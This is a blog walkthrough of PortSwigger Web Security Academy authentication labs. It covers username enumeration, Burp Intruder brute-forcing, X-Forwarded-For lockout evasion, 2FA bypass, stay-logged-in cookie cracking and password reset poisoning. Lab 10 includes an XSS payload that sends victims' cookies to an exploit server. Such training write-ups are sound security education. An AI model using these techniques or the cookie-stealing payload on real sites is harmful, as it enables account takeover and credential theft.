---
layout: post
title: PortSwigger - Authentication vulnerabilities labs
date: 2026-06-03 00:00:00 +0000
categories: [Writeups, PortSwigger, "Authentication"]
tags:
  - LABS
  - Authentication
  - PortSwigger
  - WebSecurity
subtitle: Walkthroughs for Labs 1-6
description: PortSwigger Web Security Academy - Authentication vulnerabilities labs
image: /assets/image/Portswigger/download.png
paginate: true
---

# PortSwigger – Authentication Vulnerabilities Labs

---

## LAB 1 — Username Enumeration via Different Responses

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration + password brute-force |
| **Goal** | Enumerate a valid username, brute-force the password, then access the account page |
| **Key Concept** | Different error messages reveal valid usernames — `Invalid username` vs `Incorrect password` |

### Steps

**1.** Login with wrong credentials → got `Invalid username`

![](/assets/labs/authenticationv/image-1.png)

**2.** Download the username and password lists from the lab description

![](/assets/labs/authenticationv/image-2.png)

**3.** Intercept the login request with Burp and send it to Intruder

![](/assets/labs/authenticationv/image-3.png)

**4.** Set the username field as payload position, load the username list, and start the attack — all responses show `Incorrect username` except one: **`americas`**

![](/assets/labs/authenticationv/image-4.png)

**5.** With the valid username found, brute-force the password — filter for 30x redirects → password is **`password`**

![](/assets/labs/authenticationv/image-5.png)

**6.** Login with `americas` / `password` →  Solved

![](/assets/labs/authenticationv/image-6.png)

---

## LAB 2 — 2FA Simple Bypass

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image-7.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | 2FA bypass |
| **Goal** | Access Carlos's account page |
| **Key Concept** | The app doesn't verify the 2FA step was completed — navigating directly to `/my-account` after entering valid credentials skips it entirely |

### Steps

**1.** Login with `wiener` / `peter` → the app asks for a 4-digit 2FA code

![](/assets/labs/authenticationv/image-8.png)

**2.** Click "Email Client" at the top of the lab

![](/assets/labs/authenticationv/image-9.png)

**3.** Find the code sent: `1723`

![](/assets/labs/authenticationv/image-10.png)

**4.** Enter the code → redirected to `/my-account`

![](/assets/labs/authenticationv/image-11.png)

**5.** Note the endpoint pattern: `/my-account?id=username`

![](/assets/labs/authenticationv/image-12.png)

**6.** Logout → login as `carlos` → 2FA prompt appears but there's no access to Carlos's email

![](/assets/labs/authenticationv/image-13.png)

**7.** The current endpoint at this point is `login2`

![](/assets/labs/authenticationv/image-14.png)

**8.** Change the URL directly to `/my-account` →  Solved

![](/assets/labs/authenticationv/image-15.png)

---

## LAB 3 — Password Reset Broken Logic

> **Level:** `APPRENTICE`

![](/assets/labs/authenticationv/image-16.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Broken password reset |
| **Goal** | Reset Carlos's password then log in |
| **Key Concept** | The reset token isn't validated server-side — changing the `username` parameter in the request resets any user's password |

### Steps

**1.** Login with `wiener` / `peter`

![](/assets/labs/authenticationv/image-17.png)

**2.** Logout → click "Forgot password" → enter username → submit

![](/assets/labs/authenticationv/image-18.png)

**3.** Open the Email Client from the top of the page

![](/assets/labs/authenticationv/image-19.png)

**4.** Copy the reset link and start Burp to capture traffic

![](/assets/labs/authenticationv/image-20.png)

**5.** Open the link → "Set new password" page appears

![](/assets/labs/authenticationv/image-21.png)

**6.** Intercept the request when submitting the new password

![](/assets/labs/authenticationv/image-22.png)

**7.** Change the `username` parameter to `carlos` → send → success ✓

![](/assets/labs/authenticationv/image-23.png)

**8.** Login with `carlos` and the new password →  Solved

![](/assets/labs/authenticationv/image-24.png)

---

## LAB 4 — Username Enumeration via Subtly Different Responses

> **Level:** `PRACTITIONER`

![](/assets/labs/authenticationv/image-26.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration |
| **Goal** | Find a valid username and password |
| **Key Concept** | The error message ends with a `.` for invalid credentials — but that period disappears when the username is valid |

### Steps

**1.** Download the username and password lists

![](/assets/labs/authenticationv/image-25.png)

**2.** Login with invalid credentials → intercept in Burp → send to Intruder

![](/assets/labs/authenticationv/image-27.png)

**3.** Brute-force the username field with the downloaded list

![](/assets/labs/authenticationv/image-28.png)

**4.** All responses return `Invalid username or password.` — do a **negative search** (filter out this string) to find the different one

![](/assets/labs/authenticationv/image-29.png)

**5.** One result stands out — the trailing `.` is missing → valid username: **`alpha`**

![](/assets/labs/authenticationv/image-30.png)

**6.** Brute-force the password for `alpha` using the password list

![](/assets/labs/authenticationv/image-31.png)

**7.** Filter for 30x redirects

![](/assets/labs/authenticationv/image-32.png)

**8.** Password found: **`jessica`** → login →  Solved

![](/assets/labs/authenticationv/image-33.png)

---

## LAB 5 — Username Enumeration via Response Timing

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration and password brute-force attacks |
| **Goal** | Find a valid username and password |
| **Key Concept** | The app checks username first, then password. If the username is invalid it returns immediately. If valid, it proceeds to check the password — making it take longer. By sending a very long password and measuring response time, we can identify valid usernames. |

### Steps

**1.** Open the lab and go to My Account page

![](/assets/image/Portswigger/authee/image-1.png)

**2.** Try to login with invalid username or password and intercept request with Burp

![](/assets/image/Portswigger/authee/image-2.png)

**3.** Send request to Intruder — download username and password lists from the lab main page

**4.** Select username in Intruder, load username list as payload, and start attack

![](/assets/image/Portswigger/authee/image-3.png)

**5.** Got error: `You have made too many incorrect login attempts. Please try again in 30 minute(s).`

![](/assets/image/Portswigger/authee/image-4.png)

**6.** Use `X-Forwarded-For` header to change IP per request — switch to **Pitchfork** attack:

![](/assets/image/Portswigger/authee/image-5.png)

- Payload 1: Numbers 1–100
- Payload 2: Username list

**7.** Start attack — the error disappears

![](/assets/image/Portswigger/authee/image-6.png)

**8.** Set a very long password to force the app to take more time when the username is valid

![](/assets/image/Portswigger/authee/image-7.png)

**9.** Start attack again

**10.** Sort by **Response Complete** time

![](/assets/image/Portswigger/authee/image-8.png)

**11.** Identify the request that takes significantly longer

![](/assets/image/Portswigger/authee/image-9.png)

**12.** Username `app01` takes more time — confirm in Repeater

**13.** Set `app01` as username in Intruder, load password list, and start attack

![](/assets/image/Portswigger/authee/image-10.png)

**14.** Filter responses for 30x redirects

![](/assets/image/Portswigger/authee/image-11.png)

**15.** Password found

![](/assets/image/Portswigger/authee/image-12.png)

**16.** Login with `app01` : `taylor` →  Solved

![](/assets/image/Portswigger/authee/image-13.png)

---

## LAB 6 — Broken Brute-Force Protection, IP Block

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-14.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Logic flaw in password brute-force protection |
| **Goal** | Find a valid password for username `carlos` |
| **Key Concept** | The app blocks after 3 failed attempts. But logging in successfully with a valid account resets the counter. By alternating 2 failed attempts for `carlos` with 1 valid login as `wiener`, we can brute-force indefinitely. |

### Steps

**1.** Start the lab, intercept a login request with `carlos` and invalid password → send to Intruder

![](/assets/image/Portswigger/authee/image-15.png)

**2.** Go to **Resource Pool** → set max concurrent requests = 1

![](/assets/image/Portswigger/authee/image-16.png)

**3.** Build a credential list: 2 carlos attempts → 1 valid wiener login → repeat

```
carlos:password
carlos:password
wiener:peter
carlos:password
carlos:password
...
```

**4.** Python script to generate this pattern:

```python
print('usernames ------------------------------------------------------')
for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")

print('Passwords ------------------------------------------------------')
with open('password.txt', 'r') as f:
    line = f.readlines()

i = 0
for word in line:
    if i % 3:
        print(word.strip('\n'))
    else:
        print("peter")
        print(word.strip('\n'))
        i = i + 1
    i = i + 1
```

![](/assets/image/Portswigger/authee/image-17.png)

**5.** Copy all usernames and passwords into Burp Intruder — use **Pitchfork** attack

![](/assets/image/Portswigger/authee/image-18.png)

**6.** Start attack

![](/assets/image/Portswigger/authee/image-19.png)

**7.** Filter output by `Incorrect password`

![](/assets/image/Portswigger/authee/image-20.png)

**8.** All wiener results show up — carlos password appears once

![](/assets/image/Portswigger/authee/image-21.png)

**9.** Login with `carlos` : `matthew` →  Solved

![](/assets/image/Portswigger/authee/image-22.png)

---

## LAB 7 — Username Enumeration via Account Lock

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-23.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Username enumeration |
| **Goal** | Find a valid username and valid password |
| **Key Concept** | The app locks accounts after multiple failed attempts — but only for valid usernames. An invalid username returns no error regardless of how many attempts. This behavior reveals valid usernames. |

### Steps

**1.** Open the lab → intercept a login request → send to Intruder

![](/assets/image/Portswigger/authee/image-24.png)

**2.** Python script to repeat each username 10 times:

```python
print('usernames ------------------------------------------------------')
with open('username.txt', 'r') as f:
    lines = f.readlines()

for username in lines:
    for i in range(10):
        print(username.strip('\n'))
```

**3.** Copy output and paste as payload in Intruder

![](/assets/image/Portswigger/authee/image-25.png)

**4.** All responses contain `Invalid username or password.` — except one

![](/assets/image/Portswigger/authee/image-26.png)

**5.** Valid username found: **`info`** — now brute-force the password

![](/assets/image/Portswigger/authee/image-27.png)

Filter by:

![](/assets/image/Portswigger/authee/image-29.png)

**6.** All passwords return `You have made too many incorrect login attempts. Please try again in 1 minute(s).` — except one

![](/assets/image/Portswigger/authee/image-28.png)

**7.** Valid credentials found: `info` : `1234567890` →  Solved

![](/assets/image/Portswigger/authee/image-30.png)

---

## LAB 8 — 2FA Broken Logic

> **Level:** `PRACTITIONER`

![](/assets/image/Portswigger/authee/image-31.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Vulnerable flawed logic |
| **Goal** | Login as carlos |
| **Key Concept** | In the second authentication step, the app uses a `verify` cookie to determine which account's 2FA code to check. By intercepting the request and changing `verify` to `carlos`, we generate a 2FA code for carlos — then brute-force it. |

### Steps

**1.** Login with `wiener` : `peter` → intercept the `/login2` request

![](/assets/image/Portswigger/authee/image-32.png)

**2.** Change `verify=wiener` to `verify=carlos` and delete the session cookie → send

![](/assets/image/Portswigger/authee/image-33.png)

**3.** This generates a 2FA code for carlos's account

![](/assets/image/Portswigger/authee/image-34.png)

**4.** In the browser, submit an invalid 2FA code → intercept → send to Intruder

![](/assets/image/Portswigger/authee/image-36.png)

**5.** In Intruder: delete the session cookie, change `verify` to `carlos`

![](/assets/image/Portswigger/authee/image-37.png)

**6.** Set payload type to **Brute Forcer** (0000–9999)

![](/assets/image/Portswigger/authee/image-38.png)

**7.** Start attack

**8.** Filter output for 302 responses

![](/assets/image/Portswigger/authee/image-39.png)

**9.** Found the valid code

![](/assets/image/Portswigger/authee/image-40.png)

**10.** Right-click → Show in browser

![](/assets/image/Portswigger/authee/image-41.png)

**11.**  Solved

![](/assets/image/Portswigger/authee/image-42.png)

---

## LAB 9 — Brute-Forcing a Stay-Logged-In Cookie

> **Level:** `PRACTITIONER`

### Analysis

| | |
|---|---|
| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
| **Goal** | Login as carlos |
| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. Using a password list, the hash for `carlos` can be brute-forced to log in |

### Steps

**1.** Start the lab, login as `wiener` / `peter`, and check "Stay logged in"

![](/assets/labs/authenticationv/lll/image.png)


**2.** Logged in — go to "My account" and use the "Update email" button

![](/assets/labs/authenticationv/lll/image-1.png)

**3.** Reload the page and intercept the request with Burp

![](/assets/labs/authenticationv/lll/image-2.png)

**4.** Found the stay-logged-in cookie — send it to Decoder to inspect

![](/assets/labs/authenticationv/lll/image-3.png)

**5.** First part decodes to the username `wiener:` followed by a colon

**6.** Send the second part to CrackStation to identify the hash type

![](/assets/labs/authenticationv/lll/image-4.png)

**7.** Confirmed the hash is MD5

**8.** Modify the request in Intruder to use `carlos` as the username, and remove the `id`, stay-logged-in, and session parameters from the request

![](/assets/labs/authenticationv/lll/image-6.png)

**9.** Download a password list, or copy one to a local file

![](/assets/labs/authenticationv/lll/image-7.png)

![](/assets/labs/authenticationv/lll/image-8.png)

**10.** Set up the payload in Intruder:

- First, hash each password with MD5

![](/assets/labs/authenticationv/lll/image-9.png)

- Add the prefix `carlos:`

![](/assets/labs/authenticationv/lll/image-10.png)

- Encode everything with Base64

![](/assets/labs/authenticationv/lll/image-11.png)

**11.** Start the attack and filter by `200` responses

![](/assets/labs/authenticationv/lll/image-12.png)

**12.** Found the valid password — right-click and choose "Show in browser"

![](/assets/labs/authenticationv/lll/image-13.png)

**13.** Copy the URL → open it in the browser →  Solved

![](/assets/labs/authenticationv/lll/image-14.png)

---

## LAB 10 — Offline Password Cracking

> **Level:** `PRACTITIONER`

![](/assets/labs/authenticationv/lll/image-15.png)

### Analysis

| | |
|---|---|
| **Vulnerability** | Vulnerable stay-logged-in functionality, brute force |
| **Goal** | Login as carlos and delete the account |
| **Key Concept** | The stay-logged-in cookie decodes to a username and the MD5 hash of the password. By stealing carlos's cookie via XSS and cracking the hash with a password list, the account can be accessed and deleted |

### Steps

**1.** Start the lab and login as `wiener` / `peter` with "Stay logged in" checked

![](/assets/labs/authenticationv/lll/image-16.png)

**2.** Go to the home page, open any post, and submit a comment with the body:

```js
<script>document.location='$get your url form exploit server button$'+document.cookie</script>
```

![](/assets/labs/authenticationv/lll/image-17.png)

**3.** Submit the comment and check the exploit server's access log tab

![](/assets/labs/authenticationv/lll/image-18.png)

**4.** Carlos's stay-logged-in cookie appears — decode it with Burp to reveal the username `carlos` and the MD5 hash of the password

![](/assets/labs/authenticationv/lll/image-19.png)

**5.** Crack the MD5 hash using CrackStation

![](/assets/labs/authenticationv/lll/image-20.png)

**6.** Now have the username `carlos` and the cracked password

![](/assets/labs/authenticationv/lll/image-21.png)

**7.** Login with these credentials

![](/assets/labs/authenticationv/lll/image-22.png)

**8.** Enter the password and delete the account →  Solved

![](/assets/labs/authenticationv/lll/image-23.png)

---

## LAB 11 — Password Reset Poisoning via Middleware

> **Level:** `PRACTITIONER`

### Analysis


| | |
|---|---|
| **Vulnerability** | Vulnerable  to password reset poisoning|
| **Goal** | Login as carlos  |
| **Key Concept** | This lab cover password reset poisoning vulnerability , when we try to create new password with forget password functionality it's available to redirect response for another host using `x-forward-host` header that's make us steal password token and send request using this token and change password |


### Steps

1) I start lab and go to account page : 
![alt text](/assets/labs/authenticationv/sdfasf/image-24.png)

2) click forget password and burp running in back ground to record all requests : 

![alt text](/assets/labs/authenticationv/sdfasf/image-25.png)

3) i entered username weiner and clicked submit  go to exploit server email client tab and i got this link: 
![alt text](/assets/labs/authenticationv/sdfasf/image-26.png)

4) this link redirect me to change password page : 
![alt text](/assets/labs/authenticationv/sdfasf/image-27.png)

5) write new password 2 times then submit again 

6) password changed and we recorded all request with burp http history :

![alt text](/assets/labs/authenticationv/sdfasf/image-28.png)

7) now we need 3 requests : 

 - first one that take our username to create link to reset password : 
 ![alt text](/assets/labs/authenticationv/sdfasf/image-29.png)

 - second one is the request used to change password :
 ![alt text](/assets/labs/authenticationv/sdfasf/image-30.png)

- third one is the one we send new password on it : 

![alt text](/assets/labs/authenticationv/sdfasf/image-31.png)

**Send all to Repeater**

8) now when i try to inject x-forward-host header in first request i got 200 ok :
![alt text](/assets/labs/authenticationv/sdfasf/image-32.png)

9) now let's make user carlos and X-Forwarded-Host to our exploit server link : 
![alt text](/assets/labs/authenticationv/sdfasf/image-33.png)

10) Go to exploit server access log and i got carlos token to reset password: 
![alt text](/assets/labs/authenticationv/sdfasf/image-34.png)

11) let's use this token in request to reset passowrd  :
![alt text](/assets/labs/authenticationv/sdfasf/image-35.png)

12) I got 302 it's mean password changed and redirected to login page : 

14) Try to log in to user carlos and password i set and Solved : 
![alt text](/assets/labs/authenticationv/sdfasf/image-36.png)
---

## LAB 12 — Password Brute-Force via Password Change

> **Level:** `PRACTITIONER`

### Analysis

| | |
|---|---|
| **Vulnerability** | The password change functionality makes it vulnerable to brute-force attacks|
| **Goal** | Login as carlos  |
| **Key Concept** | This lab contain password change functionality with 3 fields 2 for new password 1 for current password if i enter new password mismatch its say `new passwords mismatch` if i entered current password wrong and the new password mismatch it's say `current password wrong` and this make it available to brute force attack |

### Steps

1) start lab and login as wiener:peter : 
![alt text](/assets/labs/authenticationv/sdfasf/image-37.png)

2) Try to change password and write password 2 different password to get `New passwords do not match`  first message : 

![alt text](/assets/labs/authenticationv/sdfasf/image-38.png)

3) Try to change password and write current password wrong with 2 password mismatch values and got `Current password is incorrect`: 
![alt text](/assets/labs/authenticationv/sdfasf/image-39.png)

4) that's make sense we disable brute force protection when write new value mismatch 

5) capture traffic and send it to intruder : 
![alt text](/assets/labs/authenticationv/sdfasf/image-40.png)

6) make user name `carlos` password this to attack and new password to 2 mismatched passwords set payload to list we got in the lab description: 

7) go to setting to filter out put and set match for `new passwords mismatch` :
![alt text](/assets/labs/authenticationv/sdfasf/image-41.png)

8) start attack : 
![alt text](/assets/labs/authenticationv/sdfasf/image-42.png)

9) we got one password the give us `new passwords mismatch` : 
![alt text](/assets/labs/authenticationv/sdfasf/image-43.png)
10) login in as carlos and solved : 
![alt text](/assets/labs/authenticationv/sdfasf/image-44.png)
---

## LAB 13 — Broken Brute-Force Protection, Multiple Credentials per Request

> **Level:** `EXPERT`

### Analysis

*(coming soon)*

### Steps

*(coming soon)*

---

## LAB 14 — 2FA Bypass Using a Brute-Force Attack

> **Level:** `EXPERT`

### Analysis

*(coming soon)*

### Steps

*(coming soon)*

---

**Finished — Happy Hacking!**

---

**Find me online:**
- TryHackMe: [t4t4r1s](https://tryhackme.com/p/t4t4r1s)
- HackTheBox: [t4t4r1s](https://app.hackthebox.com/users/2203575)
- LinkedIn: [Mustafa Eltayeb](https://www.linkedin.com/in/t4t4r1s)
- X: [@mustafa_altayeb](https://x.com/t4t4r1s)

---

<iframe src="https://tryhackme.com/api/v2/badges/public-profile?userPublicId=3186403" style="border:none;"></iframe>